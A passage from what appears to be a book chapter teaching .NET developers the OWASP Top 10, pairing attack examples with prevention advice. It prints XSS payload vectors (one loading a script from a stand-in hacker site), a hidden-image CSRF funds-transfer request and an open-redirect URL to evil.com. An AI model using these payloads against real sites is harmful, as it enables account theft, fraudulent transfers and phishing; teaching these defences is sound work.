&lt;objecttype="text/x-scriptlet"data="http://hackersite.com/xss.html"/&gt;</pre></div><p>Note that even <span class="emphasis"><em>innocent</em></span> tags, such <a id="id995" class="indexterm"/>as <code class="literal">div</code>, <code class="literal">table</code>, or <code class="literal">body</code>, can be used for these purposes:</p><div class="informalexample"><pre class="programlisting">&lt;!-- &lt;div&gt; XSS --&gt;
&lt;divstyle="background-image: url(javascript:alert('XSS'))"&gt;&lt;/div&gt;
&lt;!-- &lt;div&gt; XSS --&gt;
&lt;divstyle="width: expression(alert('XSS'));"&gt;&lt;/div&gt;
&lt;!-- &lt;table&gt; XSS --&gt;
&lt;tablebackground="javascript:alert('XSS')"&gt;
&lt;!-- &lt;td&gt; XSS --&gt;
&lt;tr&gt;&lt;tdbackground="javascript:alert('XSS')"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;!-- onload attribute --&gt;
&lt;bodyonload=alert("XSS")&gt;
&lt;!-- background attribute --&gt;
&lt;bodybackground="javascript:alert('XSS')"&gt;</pre></div><div class="section" title="Prevention"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec122"/>Prevention</h2></div></div></div><p>In <a id="id996" class="indexterm"/>general, the documentation states that:</p><div class="blockquote"><blockquote class="blockquote"><p>Preventing XSS requires separation of untrusted data from active browser content.</p></blockquote></div><p>Actually, to afford the problem, there <a id="id997" class="indexterm"/>are several suggestions:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">We should start by properly <a id="id998" class="indexterm"/>escaping all untrusted data based on the HTML context (as we've seen: body, attributes, any JavaScript or CSS, or even URLs) taken from the user. The <span class="emphasis"><em>XSS (Cross Site Scripting) Prevention Cheat Sheet</em></span> (<a class="ulink" href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a>) documentation contains details on how these data escaping techniques can be applied.</li><li class="listitem">The whitelist input validation technique we saw in the previous points is also recommended, but it is not a complete defense because some applications require the admission of special characters. For this scenario, we should validate the length, characters, format, and business rules before accepting any entry.</li><li class="listitem">Other measures include auto-sanitization libraries and even the use of a <span class="strong"><strong>Content Security Policy</strong></span> (<span class="strong"><strong>CSP</strong></span>) to<a id="id999" class="indexterm"/> defend your entire site against XSS.</li></ul></div><p>In .NET, some measures are taken by default, as we mentioned earlier. This includes the insertion of some<a id="id1000" class="indexterm"/> JavaScript libraries by default, such as jQuery Validate and jQuery Validate Unobtrusive, in order to check the user's input prior to sending any data to the server.</p><p>As always, it is recommended that you consider the business value and also the business impact of the possibly affected areas of the application as well as the data that is processed.</p><p>Another resource to keep in mind<a id="id1001" class="indexterm"/> would be the <span class="emphasis"><em>DOM based XSS Prevention Cheat Sheet</em></span> (<a class="ulink" href="https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</a>) documentation.</p></div></div>
<div class="section" title="A4 &#x2013; Insecure Direct Object References" id="aid-22O7C1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec64"/>A4 – Insecure Direct Object References</h1></div></div></div><p>Let's<a id="id1002" class="indexterm"/> remember this<a id="id1003" class="indexterm"/> definition:</p><div class="blockquote"><blockquote class="blockquote"><p>A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.</p></blockquote></div><p>For some scenarios, this requires the attacker (who happens to be a legitimate user of the site) to know something <a id="id1004" class="indexterm"/>about the resource to be attacked in order to substitute the expected information (such as their user account) for the victim's information (in this case, another account number, for example).</p><p>The canonical example offered by OWASP recreates a scenario in which a query about an account is to be done using a SQL request:</p><div class="informalexample"><pre class="programlisting">String query = "SELECT * FROM accts WHERE account = ?";
PreparedStatement pstmt =connection.prepareStatement(query , … );
pstmt.setString( 1, request.getParameter("accountNo"));
ResultSet results = pstmt.executeQuery( );</pre></div><p>The key is in <code class="literal">request.GetParameter("accountNo")</code>. An attacker can change this account number for another (once logged in) and try to have access to somebody else's information.</p><p>For example, if the account number is sent in the URL, it's possible to recreate this request, including the intended, foreign account:</p><div class="informalexample"><pre class="programlisting">http://example.com/app/accountInfo?acct=AnotherAccountNo</pre></div><p>This is a direct reference to a restricted resource, and the question is: should the user really have access to the <code class="literal">AnotherAccountNo</code> parameter included in the request?</p><p>Also, it may well happen that the reference is an indirect one. So, the question to answer here, as the OWASP reminds us, would be:</p><div class="blockquote"><blockquote class="blockquote"><p>If the reference is an indirect reference, does the mapping to the direct reference fail to limit the values to those authorized for the current user?</p></blockquote></div><p>Note that automated tools <a id="id1005" class="indexterm"/>don't usually look for these kind of flows just because they are not able to recognize what is to be protected and what is not. This type of vulnerability is quite common, but we find it in applications due to untested coding scenarios.</p><div class="section" title="Prevention"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec123"/>Prevention</h2></div></div></div><p>The recommended prevention <a id="id1006" class="indexterm"/>approach is to avoid insecure direct object references, protecting object numbers, filenames, and so on.</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Utilization of a per-user or session indirect object reference is recommended. This means, for instance, that a user is now allowed to manually introduce the account number to be requested, but, instead, a description, or even a reference to it.<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">This description (or reference) will be resolved at runtime, mapping it to the proper user's account.</li></ul></div></li><li class="listitem">Also, we are reminded that <span class="emphasis"><em>Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object</em></span>.<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Solving this in .NET projects is easy using the corresponding procedure before <a id="id1007" class="indexterm"/>establishing a connection or access to the requested resource.</li><li class="listitem">For instance, the program can internally store the list or the available resources for a logged user and only allow these resources before any attempt to access them is made</li></ul></div></li></ul></div><p>OWASP <a id="id1008" class="indexterm"/>
<span class="strong"><strong>Enterprise Security API Project</strong></span> (<span class="strong"><strong>ESAPI</strong></span>) contains more information about how to manage these types of attacks (<a class="ulink" href="https://www.owasp.org/index.php/Project_Information:_OWASP_Enterprise_Security_API_Project">https://www.owasp.org/index.php/Project_Information:_OWASP_Enterprise_Security_API_Project</a>).</p><div class="note" title="Note"><h3 class="title"><a id="note29"/>Note</h3><p>Another official set of guidelines and recommendations are available on <span class="emphasis"><em>Top 10 2007-Insecure Direct Object Reference</em></span> at <a class="ulink" href="https://www.owasp.org/index.php/Top_10_2007-Insecure_Direct_Object_Reference">https://www.owasp.org/index.php/Top_10_2007-Insecure_Direct_Object_Reference</a>.</p></div><p>Note that the user might also<a id="id1009" class="indexterm"/> base their attack on files, requesting an already known resource file that contains protected information.</p><p>Troy Hunt, an MVP developer for Pluralsight, exposes one of these attacks in detail using an ASP.NET application in which the details of a<a id="id1010" class="indexterm"/> user account are available once the user has logged in (refer to <a class="ulink" href="https://www.troyhunt.com/owasp-top-10-for-net-developers-part-4/">https://www.troyhunt.com/owasp-top-10-for-net-developers-part-4/</a>).</p><p>The following screenshot gives us the key to the attack:</p><div class="mediaobject"><img src="../Images/image00650.jpeg" alt="Prevention"/></div><p style="clear:both; height: 1em;"> </p><p>As you can see, the key is that using the debugger tools, we can check the format in which the information is sent to the server. In this case, there's a WCF service invoked (<code class="literal">CustomerService.svc</code>), and in that service, the <code class="literal">GetCustomer</code> method is called, passing it a JavaScript <a id="id1011" class="indexterm"/>object containing the key of the customer.</p><p>Well, that's all the attacker needs. Now, they can change the number with another one and use a tool such as Fiddler to prepare a request that includes the modified information, for example, about another <code class="literal">customerId</code>.</p><p>One of the flaws, in this case, is that <code class="literal">customerId</code> is largely predictable since it's a number. Using a GUID here, as Hunt suggests in his article, is much more secure and doesn't give any extra clue to the attacker (remember that when we saw how to use MongoDB, one of the characteristics was that the <code class="literal">ObjectId</code> that MongoDB assigns to each document is, precisely, a GUID).</p><p>Of course, the other problem in this sample was that you could send a request by simply adding a request body just as if you were still using the application in an expected manner. I suggest that you read the previously mentioned article if you are interested in the details of this type of attack.</p></div></div>
<div class="section" title="A5 &#x2013; Security Misconfiguration" id="aid-23MNU1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec65"/>A5 – Security Misconfiguration</h1></div></div></div><p>Again, the OWASP has<a id="id1012" class="indexterm"/> been very precise in defining the goals and motivations behind this security issue:</p><div class="blockquote"><blockquote class="blockquote"><p>Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.</p></blockquote></div><p>There are many implications related to the<a id="id1013" class="indexterm"/> previous definition; some of them were already mentioned in <a class="link" title="Chapter 9. Architecture" href="part0048.xhtml#aid-1DOR02">Chapter 9</a>, <span class="emphasis"><em>Architecture</em></span>, when we discussed security in the ALM and mentioned S3: Secure by Design, Secure by Default, and Secure in Deployment.</p><p>S3 relates to this topic in a way. On the one hand, the design can come from a bad initial design, which doesn't relate to the Threat Model in a proper way, so security flaws are only discovered when it's too late and when they require patches.</p><p>The second point is also crucial. Only, the functionality needed to perform the required actions should be implemented (or made visible). This is one of the first principles to apply to any system in relation to security.</p><p>With respect to the deployment, there are several considerations: perimeter security, which should be made in consensus with the development team, and everything related to configuration files and resources.</p><div class="section" title="Possible examples of attacks"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec124"/>Possible examples of attacks</h2></div></div></div><p>Again, the documentation recreates four possible examples of attack scenarios related to misconfiguration:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong>Scenario #1</strong></span>: If any of the <a id="id1014" class="indexterm"/>servers in production have left the admin console that's installed and the default accounts are the same, an attacker might find out those pages, log in using the default passwords, and take over the system.</li><li class="listitem"><span class="strong"><strong>Scenario #2</strong></span>: The ability of directory listing should be removed from the server (or checked whether it is removed in case it's a default feature of that server). If an attacker can list files, they can find the source code and study it in order to look for flaws and gain access to the system.</li><li class="listitem"><span class="strong"><strong>Scenario #3</strong></span>: Extra information related to error messages is an important source of information for any attacker: stack traces, ASP.NET yellow screens, and so on.</li><li class="listitem"><span class="strong"><strong>Scenario #4</strong></span>: Sometimes during the development process, demo applications are used as proof of concept of certain features in the application. If they are not deleted, they might <a id="id1015" class="indexterm"/>have security flaws.</li></ul></div><div class="section" title="Prevention – aspects to consider"><div class="titlepage"><div><div><h3 class="title"><a id="ch11lvl3sec74"/>Prevention – aspects to consider</h3></div></div></div><p>So, when establishing a strategy for configuration, the following points should be checked according to OWASP:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Software<a id="id1016" class="indexterm"/> obsolescence: This covers all aspects involved; the operating system, the servers, database management, third-party applications, and any other resource the solution might use. (There's more about it in A9).</li><li class="listitem">Revise the Secure by default principle: Are all available features needed? In general, a review of the installed items is mandatory (privileges, accounts, ports, pages, services, and so on). This is also referred to as the principle of least privilege.</li><li class="listitem">Have you canceled the resources enabled while the development process took place? These can include accounts (and their passwords), files, demos, and so on.</li><li class="listitem">Did you change the default error pages used while developing? They can reveal informative error messages to potential attackers.</li><li class="listitem">What's the state of the security settings in TFS, IDEs, and libraries? Are they set to secure values?</li></ul></div></div><div class="section" title="Prevention – measures"><div class="titlepage"><div><div><h3 class="title"><a id="ch11lvl3sec75"/>Prevention – measures</h3></div></div></div><p>For a complete set of features to<a id="id1017" class="indexterm"/> keep in mind, the ASVS areas regarding Crypto, Data Protection, and SSL are helpful. However, there are some minimum measures that your sensitive data should comply with in order to be protected:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Establish a hardening process (repeatable and automated) to make it easy and fast to deploy an application in a different environment with security in mind.</li><li class="listitem">Make sure that the process of updating software in relation to the operating system and the application itself is easy and as automated as possible. Remember to also consider libraries (proper and external).</li><li class="listitem">Think of the architecture from the beginning as a strong structure that provides a suitable separation between different components.</li><li class="listitem">You should contemplate periodical scanning and audits to help in the detection of possible flaws in the configuration (in the system or the application).</li></ul></div><p>Remember all we said up<a id="id1018" class="indexterm"/> until this point in relation to sensitive information, its location, and availability.</p><p>Also, remember that often, hosting applications in the cloud is an extra benefit for security since many of these operations are automatically carried on by the cloud's maintenance infrastructure.</p></div></div></div>
<div class="section" title="A6 &#x2013; Sensitive Data Exposure" id="aid-24L8G1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec66"/>A6 – Sensitive Data Exposure</h1></div></div></div><p>Data exposure <a id="id1019" class="indexterm"/>deals with revelation of information or information disclosure. The OWASP document defines it saying that:</p><div class="blockquote"><blockquote class="blockquote"><p>"Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser."</p></blockquote></div><p>This topic relates to the disclosure <a id="id1020" class="indexterm"/>of sensitive information when such information can be used not just in a cyber attack, but also in certain types of theft, such as what might happen when health records, credentials, personal data, or credit cards are at risk.</p><p>The officially vulnerable scenarios presented by the documentation remind us that for such kind of data, we should confirm the following:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Check whether any of this data is stored in clear text (for some time), including possible backups of this information.</li><li class="listitem">Make sure that this data is not transmitted in clear text, either internally or externally. Beware of the traffic on the Internet since it is dangerous by default.</li><li class="listitem">How updated are the cryptographic algorithms? For instance, SHA1 has reported some vulnerabilities a few years ago (we've mentioned this earlier), which led some companies to switch to stronger versions, SHA256 or SHA512.<div class="note" title="Note"><h3 class="title"><a id="note30"/>Note</h3><p>Wikipedia reminds <a id="id1021" class="indexterm"/>us that:</p><p>In February 2005, an attack by Xiaoyun Wang, Yiqun Lisa Yin, and Hongbo Yu was announced. The attacks can find collisions in the full version of SHA-1, requiring fewer than 2e69 operations. (A brute-force search would require 2e80 operations.)</p></div></li><li class="listitem">How powerful are the generated crypto keys? Is the key management and rotation being used?</li><li class="listitem">What about directives or headers for browser security? Are they missing when this special data is provided by or sent to the browser?</li></ol><div style="height:10px; width: 1px"/></div><p>For a complete set of problems to avoid, refer to ASVS areas Crypto (V7), Data Prot. (V9), and SSL (V10).</p><p>The three canonical scenarios<a id="id1022" class="indexterm"/> of attack that OWASP presents are as follows:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong>Scenario #1</strong></span>: An application encrypts credit card numbers in a database using automatic database encryption. However, this means that it also decrypts this data automatically when retrieved, allowing an SQL injection flaw to retrieve credit card numbers in clear text. The system should have encrypted the credit card numbers using a public key and only allowed backend applications to decrypt them with the private key.</li><li class="listitem"><span class="strong"><strong>Scenario #2</strong></span>: A site simply doesn't use SSL for all authenticated pages. The attacker simply monitors network traffic (such as an open wireless network) and steals the user's session cookie. The attacker then replays this cookie and hijacks the user's session, accessing the user's private data.</li><li class="listitem"><span class="strong"><strong>Scenario #3</strong></span>: The password database uses unsalted hashes to store everyone's passwords. A file upload flaw allows an attacker to retrieve the password file. All of the unsalted hashes can be exposed with a rainbow table of pre-calculated hashes.</li></ul></div><p>Moreover, sometimes, the new facilities provided by updated environments, if not used properly, can lead to security flaws. This is the case with some of the new attributes we find in HTML5 related to <code class="literal">&lt;input&gt;</code> tags.</p><p>For example, we now have an <code class="literal">autocomplete</code> attribute (supported by most of browsers) that activates the caching of data in local storage. It's quite simple to implement:</p><div class="informalexample"><pre class="programlisting">&lt;!-- autocomplete (requires the element to have an id)--&gt;
&lt;labelfor="CreditCardNo"&gt;Autocomplete&lt;/label&gt;
&lt;inputtype="text"id="CreditCardNo"autocomplete="on"/&gt;</pre></div><p>This activates storage in the <a id="id1023" class="indexterm"/>browser for that particular user, using that particular browser (each browser uses a distinct area), and associated with the page they're viewing at that moment.</p><p>Every time a credit card number is introduced and later sent to the browser, that information is stored locally and persists for the later usage of the page. If any other person can access that computer, there's no need to know about the card number because just trying the first number in the sequence (1,2,3…) will make the browser suggest all<a id="id1024" class="indexterm"/> entries starting with that number, including the last card number used.</p><p>If you try this simple code (no external libraries or extensions are required), as soon as you press number 1 on the keyboard (in my sample), all entries starting with that number are shown in an attached combo box (refer to the next screenshot):</p><div class="mediaobject"><img src="../Images/image00651.jpeg" alt="A6 – Sensitive Data Exposure"/></div><p style="clear:both; height: 1em;"> </p><p>So, for some sensitive information, we should not activate this feature (no matter how comfortable it is to the user) because it might incur a serious security flaw.</p><p>Of course, this information can be deleted along with the history of navigation, cookies, and other cacheable information, as usual.</p></div>
<div class="section" title="A7 &#x2013; Missing Function-level Access Control" id="aid-25JP21"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec67"/>A7 – Missing Function-level Access Control</h1></div></div></div><p>This feature has to do <a id="id1025" class="indexterm"/>with authorization, as it happened with other previous features. The problem here is accessing some parts of the <a id="id1026" class="indexterm"/>application for which the user is not authorized, for instance, a non-administrator user accessing the private wage records of the rest of the company). As usual, the official documentation states the problem precisely:</p><div class="blockquote"><blockquote class="blockquote"><p>Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.</p></blockquote></div><p>The symptoms can vary: the UI showing links to unauthorized functionality, authentication, and/or authorization checks missing in the server or even the server not checking the identity of requests, and so on.</p><p>OWASP exemplifies this type <a id="id1027" class="indexterm"/>of attack in two scenarios:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong>Scenario #1</strong></span>: The attacker simply forces browsers to target URLs. The following URLs require authentication. Admin rights are also required for access to the <code class="literal">admin_getappInfo</code> page.<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><code class="literal">http://example.com/app/getappInfo</code></li><li class="listitem"><code class="literal">http://example.com/app/admin_getappInfo</code></li><li class="listitem">If an unauthenticated user can access either page, that's a flaw. If an authenticated, non-admin user is allowed to access the <code class="literal">admin_getappInfo</code> page, that is also a flaw, and it may lead the attacker to more improperly protected admin pages.</li></ul></div></li><li class="listitem"><span class="strong"><strong>Scenario #2</strong></span>: A page provides an <code class="literal">action</code> parameter to specify the function being invoked, and different actions require different roles. If these roles aren't enforced, that's a flaw.</li></ul></div><p>Access control implementation inside the code is also to be checked. If you follow a single privileged request, try to verify the authorization pattern. Then, you can search the code base trying to find a pattern and identifying when that pattern is not followed. Keep in mind that automated tools rarely find these issues.</p><p>Perhaps one of the most typical examples of this attack is seen when a request shows the structure of information in the URL, allowing the user to guess the possible attacks. For instance, say, an attacker sees the following after a request:</p><div class="informalexample"><pre class="programlisting">http://thesite.com/application?userId=1234</pre></div><p>Then, it's easy to figure out the pattern to follow in order to obtain somebody else's information, just changing the number of the request at the end. If there are no proper procedures about authorization, the user can gain control over unauthorized data.</p><div class="section" title="Prevention"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec125"/>Prevention</h2></div></div></div><p>Prevention measures are well established, although they're quite difficult to automate (most of them should be <a id="id1028" class="indexterm"/>managed manually, although there are some tools):</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Try to get information from administrative components with a regular user account.</li><li class="listitem">Use a proxy and access the application as an administrator. Then, try to get access to the restricted pages using the previous regular user credentials.</li><li class="listitem">Find out as much as you can about how admins are validated in the system and make sure that proper security procedures are enforced.</li><li class="listitem">If the function is part of a workflow, try to check whether the conditions are in a suitable state to allow access.</li><li class="listitem">Try to audit failed attempts to access information in order to discover the possible paths for an attack.</li><li class="listitem">Provide access based on roles on every action method (ASP.NET MVC and the classic ASP.NET). This means having to avoid granting access based on individual users.</li></ul></div><p>Finally, note that in relation to IIS, there are two execution modes: the classical one (and the only one until version IIS 6) and the integrated mode. In the integrated mode (in use from IIS 7), .NET sees any request, so a given <code class="literal">handler</code> can authorize each request, even if the request is addressed to a<a id="id1029" class="indexterm"/> non-.NET resource (such as JavaScript or a multimedia file).</p><p>So, if you are running IIS7+ versions, make sure that the integrated mode is active because otherwise, .NET only handles requests for files such as <code class="literal">.aspx</code>, <code class="literal">.ascx</code>, and the like, so other files can be unsecured.</p></div></div>
<div class="section" title="A8 &#x2013; Cross-Site Request Forgery" id="aid-26I9K1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec68"/>A8 – Cross-Site Request Forgery</h1></div></div></div><p>Given the nature of this threat, the <a id="id1030" class="indexterm"/>official OWASP documentation <a id="id1031" class="indexterm"/>defines it with a use case of an attack:</p><div class="blockquote"><blockquote class="blockquote"><p>A CSRF attack forces a logged-on victim's browser to send a forged HTTP request, including the victim's session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim's browser to generate requests the vulnerable application thinks are legitimate requests from the victim.</p></blockquote></div><p>Perhaps one of the most typical cases is the one the documentation exposes as the <span class="emphasis"><em>canonical</em></span> attack of this kind.</p><p>The problem is an application that allows a user to send a request to a bank using plain text, without any cyphering, for instance, <code class="literal">http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243</code>.</p><p>In this case, an attacker builds another request that will transfer funds from the victim's account to the attacker's account. To make it work, the attacker embeds this code inside a request of a DOM-Based type, which we saw in previous issues, such as an <code class="literal">image</code> request or <code class="literal">iframe</code> stored on various sites that are under the control of the attacker:</p><div class="informalexample"><pre class="programlisting">&lt;img src="http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=attackersAcct#"width="0" height="0" /&gt;</pre></div><p>Now, if the potential <a id="id1032" class="indexterm"/>victim visits any of the attacker's sites while they are already authenticated to <code class="literal">example.com</code>, this forged request is going to include the session information of the victim, thus authorizing the attacker's request.</p><div class="section" title="Prevention"><div class="titlepage"><div><div><h2 class="title"><a id="ch11lvl2sec126"/>Prevention</h2></div></div></div><p>The OWASP recommends:</p><div class="blockquote"><blockquote class="blockquote"><p>Preventing CSRF requires the inclusion of an unpredictable token in each HTTP request.</p></blockquote></div><p>Also, these tokens should be<a id="id1033" class="indexterm"/> unique per user session.</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">You can include them in a hidden field, for example. The value will be sent in the body of the HTTP request, so we don't compromise the process using the URL.</li><li class="listitem">The URL (or a URL parameter) can also be used. However, as you can imagine, that supposes a higher risk because it can be analyzed.</li><li class="listitem">Another form of prevention is demanding the user to reauthenticate (something very common in e-commerce transactions) or even demonstrate that it is a human, using a CAPTCHA.</li></ul></div><p>In .NET, we've seen in A2 that our initial demo of ASP.NET will include an attribute called <code class="literal">[AntiForgeryToken]</code> for the methods marked with the <code class="literal">[HttpPost]</code> attribute.</p><p>So, you'll see the methods marked in this manner:</p><div class="informalexample"><pre class="programlisting">[ValidateAntiForgeryToken]
publicActionResultMethodProtected()
{
  // some code
}</pre></div><p>If you examine the view related to these action methods, you will see the presence of a Razor Helper:</p><div class="informalexample"><pre class="programlisting">@Html.AntiForgeryToken()</pre></div><p>This ensures that the<a id="id1034" class="indexterm"/> user cannot submit the form from a remote site because they have no way to generate the token (and you can even add a <span class="strong"><strong>salt</strong></span> to it). That provides enough protection against CSRF attacks.</p></div></div>
<div class="section" title="A9 &#x2013; Using components with known vulnerabilities" id="aid-27GQ61"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec69"/>A9 – Using components with known vulnerabilities</h1></div></div></div><p>The problem here is <a id="id1035" class="indexterm"/>external, somehow. There are libraries with vulnerabilities that can be identified and exploited using automated tools. In this <a id="id1036" class="indexterm"/>way, the threat agent can be expanded beyond well-known forms of attacks, to include an unknown factor of risk.</p><p>The official definition defines A9, stating that:</p><div class="blockquote"><blockquote class="blockquote"><p>"Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts."</p></blockquote></div><p>At first, it seems easy to find out whether a commercial or open source component has known vulnerabilities. However, different versions pose a factor of risk, especially the latest ones, which are supposed to be more secure and fix old problems on the one hand, but on the other hand, they might introduce new flaws. Not to mention that not all vulnerabilities are<a id="id1037" class="indexterm"/> reported to the control sites.</p><p>There are places such as <span class="strong"><strong>CVE</strong></span> (<span class="strong"><strong>Common Vulnerabilities and Exposures</strong></span>), found at <a class="ulink" href="https://cve.mitre.org/">https://cve.mitre.org/</a>, or <span class="strong"><strong>National Vulnerability Database</strong></span> (<span class="strong"><strong>NVD</strong></span>), which can be accessed at <a class="ulink" href="https://web.nvd.nist.gov/view/vuln/search">https://web.nvd.nist.gov/view/vuln/search</a>, in which you can search for these kind of <a id="id1038" class="indexterm"/>problems.</p><p>The question here is that vulnerabilities in components can potentially cause all types of trouble from the most simple to the most sophisticated ones, with attacks exclusively thought of for some type of component.</p><p>Examples are many, but let's just think of a few common problems:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">For many years, Adobe Flash has been the most preferred extension for browsers that companies used in order to reproduce videos, insert advertising, play audio, and so on. Actually, there were so many that Adobe would release periodic updates to deal with the security problems.<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">The situation got to a critical point when in 2010, Steve Jobs declared that no Apple mobile device would use Adobe Flash anymore. He<a id="id1039" class="indexterm"/> published a letter explaining the six main reasons to do that (<a class="ulink" href="http://www.apple.com/hotnews/thoughts-on-flash/">http://www.apple.com/hotnews/thoughts-on-flash/</a>) and recommending the use of standards such as HTML5, instead.</li></ul></div></li><li class="listitem">In the Windows world, there are many examples, but in order to give you an idea, let's think of a simple desktop application that uses some components of the control panel (which, on the other hand, is the recommended approach instead of reinventing the wheel).<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Now, imagine that we<a id="id1040" class="indexterm"/> have a simple options menu that allows the user to select the configuration before printing a report. In .NET, we have several components available, which map the corresponding dialog boxes of the operating system: <span class="strong"><strong>Print Dialog</strong></span>, <span class="strong"><strong>Print Preview</strong></span>, <span class="strong"><strong>Print Document</strong></span>, and so on.</li><li class="listitem">If we don't delimit the input values, we might end up in trouble. Let's say that the user is allowed to give any value in the font size (or even worse, any value in the number of copies). The user can establish a font size of, say, 900 pt and a number of copies of 32564 for some configurations. The system can collapse or the printing server in the network can start using virtual memory to hold the huge amount of information sent. Here, we have a very simple way to build a<a id="id1041" class="indexterm"/> <span class="strong"><strong>DoS</strong></span> (<span class="strong"><strong>Denial of Service</strong></span>) attack.</li></ul></div></li></ul></div><p>We have to consider that often, components run with the complete privileges of the application, and we usually don't have the source code to prevent these attacks.</p><p>Officially, we should do the following:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Identify all components and the versions you are using, including all dependencies (for example, the versions plugin).</li><li class="listitem">Monitor the security of these components in public databases, project mailing lists, and security mailing lists and keep them up to date.</li><li class="listitem">Establish security policies governing the component in use, such as requiring certain software development practices, passing security tests, and having acceptable licenses.</li><li class="listitem">Where appropriate, consider adding security wrappers around components in order to disable unused functionalities and/or secure weak or vulnerable aspects of the component.</li></ol><div style="height:10px; width: 1px"/></div><p>In .NET, a new document was created in OWASP in relation to this vulnerability: OWASP SafeNuGet, which is<a id="id1042" class="indexterm"/> available at <a class="ulink" href="https://www.owasp.org/index.php/OWASP_SafeNuGet">https://www.owasp.org/index.php/OWASP_SafeNuGet</a>. However, if you need to test a given component, the code required is at your disposal in a GitHub project of the same name (<a class="ulink" href="https://github.com/OWASP/SafeNuGet">https://github.com/OWASP/SafeNuGet</a>), where you'll find an MSBuild project that can <a id="id1043" class="indexterm"/>help you in the<a id="id1044" class="indexterm"/> task, along with instructions and details.</p></div>
<div class="section" title="A10 &#x2013; Invalidated redirects and forwards" id="aid-28FAO1"><div class="titlepage"><div><div><h1 class="title"><a id="ch11lvl1sec70"/>A10 – Invalidated redirects and forwards</h1></div></div></div><div class="blockquote"><blockquote class="blockquote"><p>Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages.</p></blockquote></div><p>As you can see in the<a id="id1045" class="indexterm"/> official definition, the issue here is redirection. Or, to be precise, the issue is redirection in a non secure manner.</p><p>The official documentation suggests that the best ways to find out whether some software includes dangerous forwarding of redirects are as follows:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem">Revise the code for <a id="id1046" class="indexterm"/>any redirection or forwarding (transfer in .NET). Once identified, check whether the target URL is included in any parameter values. In case it is, the target URL is not being validated against a whitelist, and therefore, you are vulnerable.</li><li class="listitem">The other possibility is that the site generates redirects, which correspond to HTTP response codes 300-307, and, typically a 302 code. Here, we should check the parameters supplied before redirection in order to see whether they look like a target URL or a fragment of a URL. If they do, you have to change the URL target and observe whether the site redirects to the new target.</li><li class="listitem">If there's no code to review, then you should check all the parameters in the search for the same URL patterns, testing those that really perform redirection.</li></ul></div><p>The documentation includes a <a id="id1047" class="indexterm"/>couple of samples of an attack, which we can adapt to a .NET environment:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><span class="strong"><strong>Scenario #1</strong></span>: The application has a page called <code class="literal">redirect.aspx</code>, which takes a single parameter named <code class="literal">url</code>. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware:<div class="informalexample"><pre class="programlisting">
<code class="literal">http://www.example.com/redirect.aspx?url=evil.com</code>
</pre></div><p>In this case, the problem is that next to the <code class="literal">url</code> parameter, the attacker might get redirected to a site of their own or another kind.</p></li><li class="listitem"><span class="strong"><strong>Scenario #2</strong></span>: The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker <a id="id1048" class="indexterm"/>crafts a URL that will pass the application's access control check and then forwards the attacker to the administrative functionality for which the attacker isn't authorized:<div class="informalexample"><pre class="programlisting">
<code class="literal">http://www.example.com/something.aspx?fwd=admin.aspx</code>
